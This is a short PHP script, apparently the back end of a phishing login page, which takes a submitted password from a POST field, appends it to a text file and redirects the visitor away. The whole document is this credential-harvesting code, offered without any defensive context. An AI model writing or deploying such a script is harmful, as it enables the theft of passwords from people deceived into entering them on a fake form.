<?php

$Name = "  Password : ";
$Name .= $_POST['pass'];



file_put_contents('write.txt', $Name, FILE_APPEND);



header('Location: ');

exit;